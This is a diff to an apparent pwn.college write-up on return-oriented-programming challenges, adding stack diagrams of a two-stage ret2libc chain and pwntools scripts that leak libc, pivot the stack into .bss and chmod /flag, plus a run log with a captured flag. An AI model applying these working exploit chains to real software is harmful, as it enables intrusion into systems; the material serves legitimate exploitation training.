@@ -30,7 +30,7 @@ The solution to this challenge is a simple ret2win exploit as we used in [this](
 
 Let's find the offset of `win()` within the program.
 
-### Bianry Analysis
+### Binary Analysis
 
 #### `win()`
 
@@ -1900,7 +1900,7 @@ Unique gadgets found: 158
 
 Using the information we have, and some of these ROP gadgets, we can craft an exploit which uses `chmod` to change files permissions.
 
-### ROP chain (ret2stack)
+### ROP chain: ret2stack
 
 This is the ROP chain that we will be performing.
 
@@ -2445,9 +2445,9 @@ Gadgets information
 Unique gadgets found: 98
 ```
 
-### ROP chain (ret2stack)
+### ROP chain: ret2stack
 
-We will be doing the same ROP chain in this challenge as the [last level](#rop-chain-ret2stack).
+We will be doing the same ROP chain in this challenge as the [easy level](#rop-chain-ret2stack).
 
 ### Exploit
 
@@ -2931,7 +2931,7 @@ Out of the various options that we have, let's go with `b"!\x00"` which is at th
 - [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
 - [x] Location of a NULL terminated string: `0x403386`
 
-### ROP chain (ret2stack)
+### ROP chain: ret2stack
 
 This is the ROP chain that we will be performing.
 
@@ -3456,7 +3456,7 @@ Gadgets information
 Unique gadgets found: 93
 ```
 
-### ROP chain (ret2stack)
+### ROP chain: ret2stack
 
 The ROP chain will be the same as the [easy version](#rop-chain-ret2stack-2).
 
@@ -4041,7 +4041,7 @@ Local exec file:
    - `pop rdx ; ret`: `0x40228e`
 - [x] Location to which flag is to be read: `0x405100`
 
-### ROP chain (ret2plt)
+### ROP chain: ret2plt
 
 This is the ROP chain that we will be performing.
 
@@ -5037,7 +5037,7 @@ Local exec file:
    - `pop rdx ; ret`: `0x401bfd`
 - [x] Location to which flag is to be read: `0x404100`
 
-### ROP chain (ret2plt)
+### ROP chain: ret2plt
 
 The ROP chain will be the same as the [easy version](#rop-chain-ret2plt).
 
@@ -5561,7 +5561,7 @@ hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /cha
    - `pop rsi ; pop r15 ; ret`: `0x401df1`
 
 
-### ROP chain (ret2libc)
+### ROP chain: ret2libc
 
 This is what the ROP chain would look like.
 
@@ -5590,7 +5590,7 @@ Stack:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -5608,7 +5608,7 @@ Stack:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -5624,7 +5624,7 @@ Stack:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -5644,7 +5644,7 @@ Stack:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -5662,7 +5662,7 @@ Stack:
                            ┌───────────────────────────┐
     rsp --> 0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -5679,7 +5679,7 @@ rip --> pop r15 ; ret
 
 Stack:
                            ┌───────────────────────────┐
-    rsp --> 0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+    rsp --> 0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -6126,7 +6126,7 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /cha
    - `pop rsi ; pop r15 ; ret`: `0x402331`
 
 
-### ROP chain (ret2libc)
+### ROP chain: ret2libc
 
 The ROP chain for this challenge will be the same as the [easy version](#rop-chain-ret2libc).
 
@@ -6725,9 +6725,269 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
    - `pop rsi ; pop r15 ; ret`: `0x402221`
 - [x] Address of `_start()`: `0x4011b0`
 
-### ROP chain (ret2libc)
+### ROP chain: ret2libc
 
-tbc.
+#### First stage: Leaking the address of `puts` entry in GOT
+
+In the first invocation, we leak the address of `puts` in Libc.
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7fff7f3afc20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc50 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7fff7f3afc58 │  00 00 00 00 00 40 22 23  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc60 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc60 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> puts@plt
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> puts@plt return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc78 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> _start()
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+We would have the address of `puts` within Libc by the end, from which we can calculate the base address of Libc and the address of `chmod` within Libc.
+The call to `_start()` would restart the challenge, and give us a chance to execute the second stage
+
+#### Second stage: Leveraging `chmod` in Libc
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7fff7f3afc20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc50 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7fff7f3afc58 │  00 00 00 00 00 40 22 23  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc60 │  00 00 00 00 00 40 36 06  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc60 │  00 00 00 00 00 40 36 06  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403606
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403606
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsi ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403606
+rsi: 0x1ff
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403606
+rsi: 0x1ff
+r15: b"BBBBBBBB"
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff7f3afc88 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403606
+rsi: 0x1ff
+r15: b"BBBBBBBB"
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("!", 0o777)
+═══════════════════════════════════════════════════════════════════════════════════
+```
 
 ### Exploit
 
@@ -7263,7 +7523,7 @@ hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-li
    - `pop rsi ; pop r15 ; ret`: `0x4022b1`
 - [x] Address of `_start()`: `0x4010d0`
 
-### ROP chain (ret2libc)
+### ROP chain: ret2libc
 
 The ROP chain in this version would be the same as the [easy version](#rop-chain-ret2libc-2).
 
@@ -7325,6 +7585,7 @@ log.info("Sending Stage 2: chmod('!', 0o777)")
 payload2 = flat(
     b"A" * offset,
     
+    # chmod("!", 0o777)
     pop_rdi, bang_addr,      
     pop_rsi_pop_r15, 0o777, b"B" * 8, 
     chmod_libc
@@ -7390,6 +7651,243 @@ You will need to figure out how to use stack pivoting to execute your full ropch
 
 ```
 
-0x7ffd64493228
+- [x] Location of the PLT entry of `puts@plt`: `0x401120`
+- [x] Location of the GOT entry of `puts@got`: `0x405028` 
+- [x] Location of the ROP chain within BSS: `0x4150e0`
+- [x] Offsets of required Libc functions
+   - Offset of the `puts` symbol within Libc: `0x84420`
+   - Offset of the `chmod` symbol within Libc: `0x10dd80`   
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x4023f3`
+   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
+- [x] Address of `_start()`: `0x402073`
 
-0x7ffc10b56cb8
+
+### ROP chain: Stack pivot + ret2libc
+
+tbc.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+context.arch = 'amd64'
+
+# ROP gadgets
+pop_rdi = 0x4023f3
+pop_rsi_pop_r15 = 0x4023f1
+pop_rsp_pop_r13_pop_r14_pop_r15 = 0x4023ed
+ret = 0x40101a
+# PLT entries
+puts_plt = 0x401120
+# GOT entries
+puts_got = 0x405028
+# Memory addresses and offsets
+_start_func_addr = 0x4011d0
+bang_addr = 0x4037bd
+bss_rop_chain_addr = 0x4150e0 + 16
+offset = 0
+
+p = process('/challenge/pivotal-prelude-easy')
+
+# --- STAGE 1: Leak address of `puts` within Libc ---
+log.info("Sending Stage 2: puts(puts@got)")
+payload1 = flat(
+    b"A" * offset,
+
+    # Stack pivot to the rest of the ROP chain in .bss
+    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, b"B" * 8, b"C" * 8, b"D" * 8,
+
+    # puts(puts@got)
+    pop_rdi, puts_got,
+    puts_plt,
+
+    # Call _start()
+    _start_func_addr
+)
+
+# Send payload
+p.send(payload1)
+
+# Parse the leak
+p.recvuntil(b"Leaving!\n")
+leak = p.recv(6)
+puts_libc = u64(leak.ljust(8, b"\x00"))
+
+# Calculate the address of the Libc entry of chmod
+libc_base = puts_libc - 0x84420
+chmod_libc = libc_base + 0x10dd80
+
+print(f"\n[+] puts@libc: {hex(puts_libc)}")
+print(f"[+] libc_base: {hex(libc_base)}")
+print(f"[+] chmod@libc: {hex(chmod_libc)}\n")
+
+# --- STAGE 2: repeat test ---
+# This ensures the "Welcome" message is out of the way 
+# and the program is actually at the 'read' call for Stage 2.
+p.recvuntil(b"execute your full ropchain!")
+
+flag_str = b"/flag\x00\x00\x00"
+
+log.info("Sending Stage 2: chmod('!', 0o777)")
+payload2 = flat(
+    b"A" * offset,
+
+    # Stack pivot to the rest of the ROP chain in .bss
+    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, flag_str, b"C" * 8, b"D" * 8,
+
+    # chmod("/flag", 0o777)
+    pop_rdi, bss_rop_chain_addr,      
+    pop_rsi_pop_r15, 0o777, b"B" * 8, 
+    chmod_libc
+)
+
+p.send(payload2)
+
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ python ~/script.py
+[+] Starting local process '/challenge/pivotal-prelude-easy': pid 753
+[*] Sending Stage 2: puts(puts@got)
+
+[+] puts@libc: 0x7c26fd067420
+[+] libc_base: 0x7c26fcfe3000
+[+] chmod@libc: 0x7c26fd0f0d80
+
+[*] Sending Stage 2: chmod('!', 0o777)
+[*] Switching to interactive mode
+
+[*] Process '/challenge/pivotal-prelude-easy' stopped with exit code -11 (SIGSEGV) (pid 753)
+Received 88 bytes! This is potentially 11 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 11 gadgets of ROP chain at 0x4150e0.
+| 0x00000000004023ed: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ; 
+| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
+| 0x00000067616c662f: (UNMAPPED MEMORY)
+| 0x4343434343434343: (UNMAPPED MEMORY)
+| 0x4444444444444444: (UNMAPPED MEMORY)
+| 0x00000000004023f3: pop rdi ; ret  ; 
+| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
+| 0x00000000004023f1: pop rsi ; pop r15 ; ret  ; 
+| 0x00000000000001ff: (UNMAPPED MEMORY)
+| 0x4242424242424242: (UNMAPPED MEMORY)
+| 0x00007c26fd0f0d80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7c26fd0f0d94 ; ret  ; 
+
+Of course, only 24 bytes of the above ropchain was copied to the stack!
+Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!
+
++--- Printing 3 gadgets of ROP chain at 0x415018.
+| 0x00000000004023ed: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ; 
+| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
+| 0x00000067616c662f: (UNMAPPED MEMORY)
+
+Leaving!
+[*] Got EOF while reading in interactive
+$
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ cat /flag 
+pwn.college{AshqlZDnJJarLIWj_35ueVUW8RT.01N1MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Pivotal Prelude (Hard)
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020` 
+- [x] Location of the ROP chain within BSS: `0x414080`
+- [x] Offsets of required Libc functions
+   - Offset of the `puts` symbol within Libc: `0x84420`
+   - Offset of the `chmod` symbol within Libc: `0x10dd80`   
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401413`
+   - `pop rsi ; pop r15 ; ret`: `0x401411`
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
+- [x] Address of `_start()`: `0x4010f0`
+
+
+### Exploit
+
+```py
+from pwn import *
+context.arch = 'amd64'
+
+# ROP gadgets
+pop_rdi = 0x401413
+pop_rsi_pop_r15 = 0x401411
+pop_rsp_pop_r13_pop_r14_pop_r15 = 0x40140d
+ret = 0x40101a
+# PLT entries
+puts_plt = 0x4010a0
+# GOT entries
+puts_got = 0x404020
+# Memory addresses and offsets
+_start_func_addr = 0x4010f0
+bss_rop_chain_addr = 0x414080 + 16
+offset = 0
+
+p = process('/challenge/pivotal-prelude-hard')
+
+# --- STAGE 1: Leak address of `puts` within Libc ---
+log.info("Sending Stage 2: puts(puts@got)")
+payload1 = flat(
+    b"A" * offset,
+
+    # Stack pivot to the rest of the ROP chain in .bss
+    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, b"B" * 8, b"C" * 8, b"D" * 8,
+
+    # puts(puts@got)
+    pop_rdi, puts_got,
+    puts_plt,
+
+    # Call _start()
+    _start_func_addr
+)
+
+# Send payload
+p.send(payload1)
+
+# Parse the leak
+p.recvuntil(b"Leaving!\n")
+leak = p.recv(6)
+puts_libc = u64(leak.ljust(8, b"\x00"))
+
+# Calculate the address of the Libc entry of chmod
+libc_base = puts_libc - 0x84420
+chmod_libc = libc_base + 0x10dd80
+
+print(f"\n[+] puts@libc: {hex(puts_libc)}")
+print(f"[+] libc_base: {hex(libc_base)}")
+print(f"[+] chmod@libc: {hex(chmod_libc)}\n")
+
+# --- STAGE 2: repeat test ---
+# This ensures the "Welcome" message is out of the way 
+# and the program is actually at the 'read' call for Stage 2.
+# p.recvuntil(b"execute your full ropchain!")
+
+flag_str = b"/flag\x00\x00\x00"
+
+log.info("Sending Stage 2: chmod('!', 0o777)")
+payload2 = flat(
+    b"A" * offset,
+
+    # Stack pivot to the rest of the ROP chain in .bss
+    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, flag_str, b"C" * 8, b"D" * 8,
+
+    # chmod("/flag", 0o777)
+    pop_rdi, bss_rop_chain_addr,      
+    pop_rsi_pop_r15, 0o777, b"B" * 8, 
+    chmod_libc
+)
+
+p.send(payload2)
+
+p.interactive()
+```
